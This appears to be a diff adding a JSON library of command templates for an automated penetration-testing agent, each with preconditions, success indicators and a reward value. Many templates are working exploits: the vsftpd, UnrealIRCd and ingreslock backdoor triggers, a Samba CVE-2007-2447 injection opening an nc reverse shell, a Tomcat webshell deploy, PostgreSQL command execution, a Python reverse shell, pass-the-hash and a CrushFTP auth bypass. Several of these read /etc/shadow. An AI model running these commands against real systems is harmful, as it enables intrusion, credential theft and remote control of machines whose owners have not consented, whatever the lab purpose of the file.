+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ldap_service_found",
+        "credentials_known"
+      ],
+      "success_indicators": [
+        "[+]",
+        "Users"
+      ],
+      "tags": [
+        "ad",
+        "cme",
+        "users",
+        "ldap"
+      ],
+      "typical_reward": 3.0
+    },
+    "cme_smb_shares": {
+      "template": "crackmapexec smb {target} -u {username} -p {password} --shares",
+      "phase": "ENUMERATION",
+      "description": "Enumerate SMB shares with credentials.",
+      "required_params": [
+        "target",
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "credentials_known",
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "READ",
+        "WRITE",
+        "[+]"
+      ],
+      "tags": [
+        "smb",
+        "cme",
+        "shares"
+      ],
+      "typical_reward": 2.5
+    },
+    "impacket_reg": {
+      "template": "impacket-reg {domain}/{username}:{password}@{target} query -keyName '{key}'",
+      "phase": "ENUMERATION",
+      "description": "Query Windows registry remotely.",
+      "required_params": [
+        "target",
+        "username",
+        "password",
+        "key"
+      ],
+      "optional_params": {
+        "domain": "."
+      },
+      "preconditions": [
+        "credentials_known",
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "REG_"
+      ],
+      "tags": [
+        "enumeration",
+        "impacket",
+        "registry"
+      ],
+      "typical_reward": 2.0
+    },
+    "wpscan": {
+      "template": "wpscan --url {url} --enumerate {enumerate} --api-token {token}",
+      "phase": "ENUMERATION",
+      "description": "WordPress vulnerability scanner. Finds plugins, themes, users.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {
+        "enumerate": "vp,vt,u",
+        "token": ""
+      },
+      "preconditions": [
+        "wordpress_found",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "Vulnerability",
+        "[!]",
+        "WordPress"
+      ],
+      "tags": [
+        "scanner",
+        "wordpress",
+        "web"
+      ],
+      "typical_reward": 3.0
+    },
+    "nuclei_scan": {
+      "template": "nuclei -u {url} -t {templates} -severity {severity}",
+      "phase": "ENUMERATION",
+      "description": "Fast vulnerability scanner with templates.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {
+        "templates": "cves/",
+        "severity": "medium,high,critical"
+      },
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "[",
+        "CVE-",
+        "found"
+      ],
+      "tags": [
+        "scanner",
+        "nuclei",
+        "web"
+      ],
+      "typical_reward": 3.5
+    },
+    "dirsearch": {
+      "template": "dirsearch -u {url} -e {extensions} -t {threads}",
+      "phase": "ENUMERATION",
+      "description": "Advanced web path scanner. Alternative to gobuster.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {
+        "extensions": "php,html,txt,bak,old",
+        "threads": "50"
+      },
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "200",
+        "301",
+        "302"
+      ],
+      "tags": [
+        "web",
+        "directories",
+        "bruteforce"
+      ],
+      "typical_reward": 2.0
+    },
+    "cme_smb_bruteforce": {
+      "template": "crackmapexec smb {target} -u {username} -p {wordlist}",
+      "phase": "ENUMERATION",
+      "description": "Brute-force SMB credentials via CrackMapExec.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {
+        "username": "admin",
+        "wordlist": "/usr/share/nmap/nselib/data/passwords.lst"
+      },
+      "preconditions": [
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "[+]",
+        "Pwn3d!"
+      ],
+      "tags": [
+        "smb",
+        "cme",
+        "credentials",
+        "bruteforce"
+      ],
+      "typical_reward": 9.0
+    },
+    "sqlmap_test": {
+      "template": "sqlmap -u '{url}' --batch --dbs",
+      "phase": "ENUMERATION",
+      "description": "Test for SQL injection and enumerate databases.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "injectable",
+        "DBMS",
+        "available databases"
+      ],
+      "tags": [
+        "sqli",
+        "credentials",
+        "web",
+        "database"
+      ],
+      "typical_reward": 9.0
+    },
+    "searchsploit": {
+      "template": "searchsploit {query}",
+      "phase": "ENUMERATION",
+      "description": "Search for known exploits in Exploit-DB.",
+      "required_params": [
+        "query"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        "Exploit",
+        "exploit/",
+        "remote",
+        "local"
+      ],
+      "tags": [
+        "exploit",
+        "search",
+        "recon"
+      ],
+      "typical_reward": 3.0
+    },
+    "redis_cli": {
+      "template": "redis-cli -h {target} INFO",
+      "phase": "ENUMERATION",
+      "description": "Connect to Redis and get server info.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "redis_service_found"
+      ],
+      "success_indicators": [
+        "redis_version",
+        "connected_clients"
+      ],
+      "tags": [
+        "redis",
+        "database"
+      ],
+      "typical_reward": 2.0
+    },
+    "certipy_find": {
+      "template": "certipy find -u {username}@{domain} -p {password} -dc-ip {target}",
+      "phase": "ENUMERATION",
+      "description": "Find vulnerable AD certificate templates (ESC1-ESC8).",
+      "required_params": [
+        "username",
+        "password",
+        "domain",
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "credentials_known",
+        "domain_joined"
+      ],
+      "success_indicators": [
+        "Vulnerable",
+        "ESC"
+      ],
+      "tags": [
+        "ad",
+        "certificates",
+        "certipy"
+      ],
+      "typical_reward": 4.0
+    },
+    "enum4linux_scan": {
+      "template": "enum4linux -a {target}",
+      "phase": "ENUMERATION",
+      "description": "Comprehensive SMB/RPC enumeration (alias for enum4linux_full).",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "Users",
+        "Shares",
+        "Password Policy"
+      ],
+      "tags": [
+        "smb",
+        "rpc",
+        "enumeration"
+      ],
+      "typical_reward": 6.0
+    },
+    "showmount_enum": {
+      "template": "showmount -e {target}",
+      "phase": "ENUMERATION",
+      "description": "Show exported NFS shares.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "Export list",
+        "/"
+      ],
+      "tags": [
+        "ms2",
+        "enum",
+        "nfs"
+      ],
+      "typical_reward": 10.0
+    },
+    "tomcat_cred_test": {
+      "template": "curl -s http://{target}:8180/manager/html --user tomcat:tomcat",
+      "phase": "ENUMERATION",
+      "description": "Test default Tomcat credentials on port 8180.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "Tomcat",
+        "Manager",
+        "200",
+        "Deploy"
+      ],
+      "tags": [
+        "ms2",
+        "creds",
+        "web",
+        "enum"
+      ],
+      "typical_reward": 15.0
+    },
+    "psql_default_creds": {
+      "template": "psql -h {target} -U postgres -c '\\l'",
+      "phase": "ENUMERATION",
+      "description": "Connect to PostgreSQL with default postgres:postgres creds.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "List of databases",
+        "template",
+        "postgres"
+      ],
+      "tags": [
+        "ms2",
+        "creds",
+        "db",
+        "enum"
+      ],
+      "typical_reward": 15.0
+    },
+    "joomscan": {
+      "template": "joomscan -u {url}",
+      "phase": "ENUMERATION",
+      "description": "Joomla CMS vulnerability scanner.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found",
+        "joomla_found"
+      ],
+      "success_indicators": [
+        "Joomla",
+        "version",
+        "vulnerability",
+        "component"
+      ],
+      "tags": [
+        "scanner",
+        "web",
+        "joomla",
+        "cms"
+      ],
+      "typical_reward": 4.0
+    },
+    "droopescan": {
+      "template": "droopescan scan drupal -u {url}",
+      "phase": "ENUMERATION",
+      "description": "Drupal CMS vulnerability scanner.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "drupal_found",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "Drupal",
+        "version",
+        "plugin",
+        "theme"
+      ],
+      "tags": [
+        "scanner",
+        "web",
+        "cms",
+        "drupal"
+      ],
+      "typical_reward": 4.0
+    },
+    "download_pcap_curl": {
+      "template": "curl -s -o /tmp/capture.pcap {url}",
+      "phase": "ENUMERATION",
+      "description": "Download a PCAP file from a web application for credential extraction",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "pcap",
+        "web",
+        "download"
+      ],
+      "typical_reward": 5.0
+    },
+    "curl_web_path": {
+      "template": "curl -sL http://{target}/{path} | head -200",
+      "phase": "ENUMERATION",
+      "description": "Explore a discovered web path to find links, forms, downloadable files",
+      "required_params": [
+        "target",
+        "path"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "web_paths_discovered"
+      ],
+      "success_indicators": [
+        "href=",
+        "<a ",
+        "download",
+        ".pcap",
+        ".cap",
+        "data",
+        "id="
+      ],
+      "tags": [
+        "follow_up",
+        "web",
+        "enumeration"
+      ],
+      "typical_reward": 5.0
+    },
+    "curl_web_path_ids": {
+      "template": "for i in $(seq 0 5); do echo \"=== /{path}/$i ===\"; curl -sL http://{target}/{path}/$i -o /dev/null -w 'Status: %{{http_code}} Size: %{{size_download}}\\n'; done",
+      "phase": "ENUMERATION",
+      "description": "Enumerate numeric IDs under a discovered web path to find IDOR patterns",
+      "required_params": [
+        "target",
+        "path"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "web_paths_discovered"
+      ],
+      "success_indicators": [
+        "Status: 200",
+        "Size:"
+      ],
+      "tags": [
+        "web",
+        "idor",
+        "enumeration"
+      ],
+      "typical_reward": 8.0
+    },
+    "idor_curl_range": {
+      "template": "for i in $(seq {start} {end}); do echo \"=== ID: $i ===\"; curl -s {base_url}/$i -o /dev/null -w 'Status: %{{http_code}} Size: %{{size_download}}\\n'; done",
+      "phase": "ENUMERATION",
+      "description": "Enumerate IDOR endpoints by iterating IDs and checking response differences",
+      "required_params": [
+        "base_url",
+        "start",
+        "end"
+      ],
+      "optional_params": {
+        "start": "0",
+        "end": "10"
+      },
+      "preconditions": [
+        "web_paths_discovered"
+      ],
+      "success_indicators": [
+        "Status: 200",
+        "Size:"
+      ],
+      "tags": [
+        "web",
+        "idor",
+        "enumeration"
+      ],
+      "typical_reward": 8.0
+    },
+    "smbclient_null_list": {
+      "template": "smbclient -L //{target}/ -N 2>/dev/null",
+      "phase": "ENUMERATION",
+      "description": "List SMB shares with null session (no authentication)",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "Disk",
+        "IPC",
+        "Sharename"
+      ],
+      "tags": [
+        "smb",
+        "windows",
+        "enumeration"
+      ],
+      "typical_reward": 5.0
+    },
+    "nfs_mount": {
+      "template": "mount -t nfs {target}:/ /tmp/nfs_mount",
+      "phase": "EXPLOITATION",
+      "description": "Mount NFS root share to access target filesystem.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "mounted",
+        "mount"
+      ],
+      "tags": [
+        "ms2",
+        "exploit",
+        "nfs"
+      ],
+      "typical_reward": 25.0
+    },
+    "hydra_smb": {
+      "template": "hydra -L {userlist} -P {passlist} {target} smb -t 4",
+      "phase": "EXPLOITATION",
+      "description": "SMB brute-force attack.",
+      "required_params": [
+        "target",
+        "userlist",
+        "passlist"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "login:",
+        "[445]"
+      ],
+      "tags": [
+        "passwords",
+        "smb",
+        "bruteforce"
+      ],
+      "typical_reward": 5.0
+    },
+    "crackmapexec_smb_bruteforce": {
+      "template": "crackmapexec smb {target} -u {userlist} -p {passlist} --continue-on-success",
+      "phase": "EXPLOITATION",
+      "description": "SMB password spraying. Tests multiple creds efficiently.",
+      "required_params": [
+        "target",
+        "userlist",
+        "passlist"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "[+]",
+        "Pwn3d!"
+      ],
+      "tags": [
+        "spray",
+        "smb",
+        "bruteforce"
+      ],
+      "typical_reward": 5.0
+    },
+    "crackmapexec_winrm": {
+      "template": "crackmapexec winrm {target} -u {username} -p {password}",
+      "phase": "EXPLOITATION",
+      "description": "Test WinRM credentials. Can get shell if successful.",
+      "required_params": [
+        "target",
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "winrm_service_found",
+        "credentials_known"
+      ],
+      "success_indicators": [
+        "[+]",
+        "Pwn3d!"
+      ],
+      "tags": [
+        "winrm",
+        "authentication"
+      ],
+      "typical_reward": 5.0
+    },
+    "impacket_psexec": {
+      "template": "impacket-psexec {domain}/{username}:{password}@{target}",
+      "phase": "EXPLOITATION",
+      "description": "PsExec-like execution with credentials \u2014 get SYSTEM shell",
+      "required_params": [
+        "target",
+        "domain",
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "credentials_known"
+      ],
+      "success_indicators": [
+        "Microsoft Windows",
+        "C:\\Windows",
+        "nt authority\\system"
+      ],
+      "tags": [
+        "ad",
+        "windows",
+        "psexec",
+        "shell"
+      ],
+      "typical_reward": 130.0
+    },
+    "impacket_wmiexec": {
+      "template": "impacket-wmiexec {domain}/{username}:{password}@{target}",
+      "phase": "EXPLOITATION",
+      "description": "WMI-based shell. More stealthy than PsExec.",
+      "required_params": [
+        "target",
+        "username",
+        "password"
+      ],
+      "optional_params": {
+        "domain": "."
+      },
+      "preconditions": [
+        "smb_service_found",
+        "admin_credentials_known"
+      ],
+      "success_indicators": [
+        "Microsoft Windows",
+        "C:\\"
+      ],
+      "tags": [
+        "impacket",
+        "wmi",
+        "shell"
+      ],
+      "typical_reward": 10.0
+    },
+    "impacket_smbexec": {
+      "template": "impacket-smbexec {domain}/{username}:{password}@{target}",
+      "phase": "EXPLOITATION",
+      "description": "SMB-based shell. Alternative to PsExec.",
+      "required_params": [
+        "target",
+        "username",
+        "password"
+      ],
+      "optional_params": {
+        "domain": "."
+      },
+      "preconditions": [
+        "smb_service_found",
+        "admin_credentials_known"
+      ],
+      "success_indicators": [
+        "Microsoft Windows",
+        "C:\\"
+      ],
+      "tags": [
+        "smb",
+        "impacket",
+        "shell"
+      ],
+      "typical_reward": 10.0
+    },
+    "impacket_GetNPUsers": {
+      "template": "impacket-GetNPUsers {domain}/ -usersfile {userfile} -no-pass -dc-ip {target} -format hashcat",
+      "phase": "EXPLOITATION",
+      "description": "AS-REP Roasting \u2014 get TGTs for accounts without Kerberos pre-auth",
+      "required_params": [
+        "target",
+        "domain"
+      ],
+      "optional_params": {
+        "userfile": "/tmp/users.txt"
+      },
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "$krb5asrep$",
+        "hash"
+      ],
+      "tags": [
+        "ad",
+        "windows",
+        "kerberos",
+        "asreproast"
+      ],
+      "typical_reward": 15.0
+    },
+    "impacket_GetUserSPNs": {
+      "template": "impacket-GetUserSPNs {domain}/{username}:{password} -dc-ip {target} -request",
+      "phase": "EXPLOITATION",
+      "description": "Kerberoasting \u2014 request TGS tickets for service accounts",
+      "required_params": [
+        "target",
+        "domain",
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "credentials_known"
+      ],
+      "success_indicators": [
+        "$krb5tgs$",
+        "ServicePrincipalName"
+      ],
+      "tags": [
+        "ad",
+        "windows",
+        "kerberos",
+        "kerberoast"
+      ],
+      "typical_reward": 15.0
+    },
+    "sqlmap_get": {
+      "template": "sqlmap -u '{url}' --batch --dbs",
+      "phase": "EXPLOITATION",
+      "description": "SQL injection on GET parameter. Auto-detects and exploits.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "sqli_suspected",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "available databases",
+        "fetching",
+        "Parameter:"
+      ],
+      "tags": [
+        "sqli",
+        "web"
+      ],
+      "typical_reward": 8.0
+    },
+    "sqlmap_post": {
+      "template": "sqlmap -u '{url}' --data '{post_data}' --batch --dbs",
+      "phase": "EXPLOITATION",
+      "description": "SQL injection on POST data.",
+      "required_params": [
+        "url",
+        "post_data"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "sqli_suspected",
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "available databases",
+        "fetching"
+      ],
+      "tags": [
+        "post",
+        "web",
+        "sqli"
+      ],
+      "typical_reward": 8.0
+    },
+    "sqlmap_shell": {
+      "template": "sqlmap -u '{url}' --os-shell",
+      "phase": "EXPLOITATION",
+      "description": "Get OS shell via SQL injection. Requires write access.",
+      "required_params": [
+        "url"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "sqli_confirmed"
+      ],
+      "success_indicators": [
+        "os-shell>",
+        "command execution"
+      ],
+      "tags": [
+        "sqli",
+        "web",
+        "shell"
+      ],
+      "typical_reward": 10.0
+    },
+    "evil_winrm": {
+      "template": "evil-winrm -i {target} -u '{username}' -p '{password}'",
+      "phase": "EXPLOITATION",
+      "description": "WinRM shell access with credentials",
+      "required_params": [
+        "target",
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "credentials_known"
+      ],
+      "success_indicators": [
+        "Evil-WinRM",
+        "PS ",
+        "Windows PowerShell"
+      ],
+      "tags": [
+        "winrm",
+        "windows",
+        "shell"
+      ],
+      "typical_reward": 50.0
+    },
+    "evil_winrm_hash": {
+      "template": "evil-winrm -i {target} -u {username} -H {hash}",
+      "phase": "EXPLOITATION",
+      "description": "WinRM with NTLM hash (pass-the-hash).",
+      "required_params": [
+        "target",
+        "username",
+        "hash"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "winrm_service_found",
+        "hash_known"
+      ],
+      "success_indicators": [
+        "Evil-WinRM",
+        "PS "
+      ],
+      "tags": [
+        "pth",
+        "winrm",
+        "shell"
+      ],
+      "typical_reward": 10.0
+    },
+    "ssh_login": {
+      "template": "sshpass -p {password} ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no {username}@{target} 'id; whoami; cat /etc/hostname'",
+      "phase": "EXPLOITATION",
+      "description": "SSH login with auto-password via sshpass. Non-interactive.",
+      "required_params": [
+        "target",
+        "username",
+        "password"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "credentials_known",
+        "ssh_service_found"
+      ],
+      "success_indicators": [
+        "$",
+        "#",
+        "Welcome",
+        "Last login",
+        "uid="
+      ],
+      "tags": [
+        "shell",
+        "ssh"
+      ],
+      "typical_reward": 10.0
+    },
+    "ssh_key_login": {
+      "template": "ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no -o BatchMode=yes -i {keyfile} {username}@{target} 'id; whoami'",
+      "phase": "EXPLOITATION",
+      "description": "SSH login with private key (BatchMode \u2014 falls back silently if key invalid).",
+      "required_params": [
+        "target",
+        "username",
+        "keyfile"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ssh_service_found",
+        "ssh_key_found"
+      ],
+      "success_indicators": [
+        "$",
+        "#",
+        "Welcome",
+        "uid="
+      ],
+      "tags": [
+        "key",
+        "shell",
+        "ssh"
+      ],
+      "typical_reward": 10.0
+    },
+    "knock": {
+      "template": "knock {target} {ports}",
+      "phase": "EXPLOITATION",
+      "description": "Port knocking sequence to open hidden ports.",
+      "required_params": [
+        "target",
+        "ports"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "port_knock_sequence_known"
+      ],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "evasion",
+        "portknock"
+      ],
+      "typical_reward": 3.0
+    },
+    "nmap_port_knock": {
+      "template": "for port in {ports}; do nmap -Pn --host-timeout 100 --max-retries 0 -p $port {target}; done",
+      "phase": "EXPLOITATION",
+      "description": "Port knocking using nmap. Use when knock command unavailable.",
+      "required_params": [
+        "target",
+        "ports"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "port_knock_sequence_known"
+      ],
+      "success_indicators": [
+        ""
+      ],
+      "tags": [
+        "nmap",
+        "portknock"
+      ],
+      "typical_reward": 3.0
+    },
+    "vsftpd_backdoor_nc": {
+      "template": "echo -e 'USER backdoor:)\\nPASS anything' | timeout 5 nc -v {target} 21 && sleep 1 && timeout 10 nc -v {target} 6200",
+      "phase": "EXPLOITATION",
+      "description": "Trigger vsftpd 2.3.4 backdoor via smiley-face user, then connect to shell on port 6200.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ftp_service_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "root",
+        "Connected to",
+        "6200"
+      ],
+      "tags": [
+        "direct_exploit",
+        "vsftpd",
+        "backdoor",
+        "ms2",
+        "shell"
+      ],
+      "typical_reward": 50.0
+    },
+    "vsftpd_backdoor_python": {
+      "template": "python3 -c \"import socket; s=socket.socket(); s.connect(('{target}',21)); s.send(b'USER backdoor:)\\r\\n'); s.recv(1024); s.send(b'PASS x\\r\\n'); s.recv(1024); s.close(); import time; time.sleep(1); s2=socket.socket(); s2.connect(('{target}',6200)); s2.send(b'id\\n'); print(s2.recv(4096).decode(errors='ignore'))\"",
+      "phase": "EXPLOITATION",
+      "description": "Python-based vsftpd 2.3.4 backdoor trigger. Opens shell on port 6200.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ftp_service_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "root",
+        "6200"
+      ],
+      "tags": [
+        "direct_exploit",
+        "vsftpd",
+        "backdoor",
+        "python",
+        "ms2",
+        "shell"
+      ],
+      "typical_reward": 50.0
+    },
+    "unrealircd_backdoor_nc": {
+      "template": "echo 'AB; id; whoami; cat /etc/shadow | head -5' | timeout 10 nc -v {target} 6667",
+      "phase": "EXPLOITATION",
+      "description": "UnrealIRCd 3.2.8.1 backdoor \u2014 'AB;' prefix triggers command execution.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "irc_service_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "root",
+        "shadow"
+      ],
+      "tags": [
+        "direct_exploit",
+        "backdoor",
+        "ms2",
+        "unrealircd",
+        "shell"
+      ],
+      "typical_reward": 50.0
+    },
+    "ingreslock_shell": {
+      "template": "{ echo 'id; whoami; uname -a; cat /etc/shadow | head -5'; sleep 3; } | timeout 15 telnet {target} 1524",
+      "phase": "EXPLOITATION",
+      "description": "Ingreslock backdoor on port 1524 \u2014 instant root shell, no auth required.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "uid=",
+        "root",
+        "shadow",
+        "Connected"
+      ],
+      "tags": [
+        "direct_exploit",
+        "ingreslock",
+        "backdoor",
+        "ms2",
+        "shell"
+      ],
+      "typical_reward": 50.0
+    },
+    "samba_usermap_exploit": {
+      "template": "echo 'nohup nc -e /bin/bash {target} 4444 &' | timeout 10 smbclient //{target}/tmp -U './=`nohup nc -e /bin/bash {target} 4444`' -N --option='client min protocol=NT1' 2>/dev/null; echo 'Triggered CVE-2007-2447'",
+      "phase": "EXPLOITATION",
+      "description": "Samba 3.0.20 username map script RCE (CVE-2007-2447). Triggers reverse shell.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "smb_service_found"
+      ],
+      "success_indicators": [
+        "session",
+        "connected",
+        "Triggered"
+      ],
+      "tags": [
+        "direct_exploit",
+        "rce",
+        "ms2",
+        "cve-2007-2447",
+        "samba"
+      ],
+      "typical_reward": 40.0
+    },
+    "tomcat_war_deploy": {
+      "template": "curl -s -u tomcat:tomcat 'http://{target}:8180/manager/deploy?path=/pwned&war=file:///usr/share/laudanum/jsp/cmd.war' && curl -s 'http://{target}:8180/pwned/cmd.jsp?cmd=id'",
+      "phase": "EXPLOITATION",
+      "description": "Tomcat default creds (tomcat:tomcat) \u2014 deploy WAR shell via manager API.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "http_service_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "OK",
+        "deployed"
+      ],
+      "tags": [
+        "direct_exploit",
+        "tomcat",
+        "deploy",
+        "ms2",
+        "webshell",
+        "war"
+      ],
+      "typical_reward": 30.0
+    },
+    "mysql_noauth_root": {
+      "template": "mysql -h {target} -u root -e 'SELECT user,password FROM mysql.user; SELECT @@version; SELECT LOAD_FILE(\"/etc/shadow\")' 2>/dev/null",
+      "phase": "EXPLOITATION",
+      "description": "MySQL root with no password \u2014 direct database access and file read.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "mysql_service_found"
+      ],
+      "success_indicators": [
+        "root",
+        "mysql",
+        "version",
+        "shadow"
+      ],
+      "tags": [
+        "ms2",
+        "mysql",
+        "direct_exploit",
+        "noauth"
+      ],
+      "typical_reward": 25.0
+    },
+    "postgres_default_rce": {
+      "template": "PGPASSWORD=postgres psql -h {target} -U postgres -c \"COPY (SELECT '') TO PROGRAM 'id; whoami; cat /etc/shadow | head -3'\" 2>/dev/null || PGPASSWORD=postgres psql -h {target} -U postgres -c 'SELECT version(); SELECT usename,passwd FROM pg_shadow;'",
+      "phase": "EXPLOITATION",
+      "description": "PostgreSQL default creds (postgres:postgres) \u2014 COPY TO PROGRAM for RCE.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "postgres_service_found"
+      ],
+      "success_indicators": [
+        "uid=",
+        "root",
+        "postgres",
+        "md5"
+      ],
+      "tags": [
+        "direct_exploit",
+        "postgres",
+        "rce",
+        "default_creds",
+        "ms2"
+      ],
+      "typical_reward": 30.0
+    },
+    "rlogin_noauth": {
+      "template": "timeout 10 rlogin -l root {target}",
+      "phase": "EXPLOITATION",
+      "description": "rlogin to target as root \u2014 no authentication on old systems.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "#",
+        "root@",
+        "Last login"
+      ],
+      "tags": [
+        "direct_exploit",
+        "rlogin",
+        "noauth",
+        "ms2",
+        "shell"
+      ],
+      "typical_reward": 40.0
+    },
+    "vnc_password_connect": {
+      "template": "timeout 10 vncviewer {target}:5900 -passwd /dev/stdin <<< 'password' 2>/dev/null || echo 'VNC password: password (try manually)'",
+      "phase": "EXPLOITATION",
+      "description": "VNC with default password 'password'. Desktop access.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "Connected",
+        "VNC",
+        "desktop"
+      ],
+      "tags": [
+        "ms2",
+        "vnc",
+        "default_password",
+        "direct_exploit"
+      ],
+      "typical_reward": 20.0
+    },
+    "nfs_mount_root": {
+      "template": "mkdir -p /tmp/nfs_mount && mount -t nfs {target}:/ /tmp/nfs_mount -o nolock 2>/dev/null && ls -la /tmp/nfs_mount/root/ && cat /tmp/nfs_mount/etc/shadow | head -5",
+      "phase": "EXPLOITATION",
+      "description": "Mount NFS root share \u2014 read entire filesystem including /etc/shadow.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "nfs_service_found"
+      ],
+      "success_indicators": [
+        "root",
+        "shadow",
+        "nfs_mount"
+      ],
+      "tags": [
+        "direct_exploit",
+        "nfs",
+        "file_read",
+        "mount",
+        "ms2"
+      ],
+      "typical_reward": 35.0
+    },
+    "python_reverse_shell": {
+      "template": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{target}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
+      "phase": "EXPLOITATION",
+      "description": "Python reverse shell \u2014 connect back to attacker listener.",
+      "required_params": [
+        "target",
+        "port"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "ports_discovered"
+      ],
+      "success_indicators": [
+        "$",
+        "#",
+        "bash"
+      ],
+      "tags": [
+        "reverse_shell",
+        "python",
+        "shell"
+      ],
+      "typical_reward": 15.0
+    },
+    "tty_stabilize": {
+      "template": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || python -c 'import pty; pty.spawn(\"/bin/bash\")' || script -qc /bin/bash /dev/null",
+      "phase": "EXPLOITATION",
+      "description": "Stabilize TTY in reverse/bind shell for full interactive terminal.",
+      "required_params": [],
+      "optional_params": {},
+      "preconditions": [
+        "linux_shell_obtained"
+      ],
+      "success_indicators": [
+        "$",
+        "#",
+        "bash-"
+      ],
+      "tags": [
+        "stabilize",
+        "shell",
+        "tty"
+      ],
+      "typical_reward": 3.0
+    },
+    "crushftp_auth_bypass": {
+      "template": "_A=$(curl -sk -D- -o/dev/null -H 'Authorization: AWS4-HMAC-SHA256 Credential=anonymous/' -H 'Host: ftp.{domain}' 'http://{target}/' | grep -oP 'CrushAuth=\\K[^;]+' | head -1) && _C=${{_A:0:4}} && curl -sk -H 'Host: ftp.{domain}' -b \"CrushAuth=$_A; currentAuth=$_C\" \"http://{target}/WebInterface/function/?command=getUserList&c2f=$_C\"",
+      "phase": "EXPLOITATION",
+      "description": "CVE-2025-31161 \u2014 CrushFTP S3-style auth bypass. Obtains anonymous admin session via AWS4-HMAC-SHA256 Credential=anonymous/ header, then enumerates all users via getUserList API.",
+      "required_params": [
+        "target"
+      ],
